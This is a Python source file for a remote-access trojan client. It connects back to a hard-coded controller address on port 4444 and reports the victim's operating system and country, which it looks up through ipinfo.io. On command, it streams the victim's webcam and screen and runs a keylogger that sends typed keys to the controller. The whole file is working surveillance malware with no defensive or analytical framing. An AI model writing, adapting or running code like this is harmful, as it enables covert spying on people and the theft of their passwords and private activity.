import socket
import cv2
import mss
import keyboard
import threading
import os
import platform
import time
import requests

SERVER_HOST = "10.0.1.33"  # Replace with your server's IP address
SERVER_PORT = 4444

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())
        time.sleep(0.1)
    cap.release()

def screen_share(client_socket):
    with mss.mss() as sct:
        while True:
            screenshot = sct.grab(sct.monitors[0])
            _, buffer = cv2.imencode('.jpg', screenshot.rgb)
            client_socket.sendall(buffer.tobytes())
            time.sleep(0.1)

def keylogger(client_socket):
    def send_keys():
        while True:
            keys = keyboard.record(until='enter')
            keylog = ""
            for key in keys:
                name = key.name
                if name in ["space", "enter", "tab"]:
                    keylog += f"[{name.upper()}]"
                elif name in ["caps lock", "ctrl", "shift", "alt", "backspace", "esc"]:
                    continue
                else:
                    keylog += name
            client_socket.sendall(keylog.encode())
            time.sleep(0.1)
    threading.Thread(target=send_keys).start()

def fetch_country():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            data = response.json()
            return data.get("country", "Unknown")
    except:
        return "Unknown"

def handle_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if command == "start_webcam":
                threading.Thread(target=webcam_stream, args=(client_socket,)).start()
            elif command == "start_screen":
                threading.Thread(target=screen_share, args=(client_socket,)).start()
            elif command == "start_keymon":
                keylogger(client_socket)
            elif command == "kill":
                break
        except:
            break

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        client_socket.send(f"{platform.system()} {platform.release()} {platform.architecture()[0]}".encode())
        country = fetch_country()
        client_socket.send(country.encode())
        handle_commands(client_socket)
    except:
        client_socket.close()

if __name__ == "__main__":
    main()
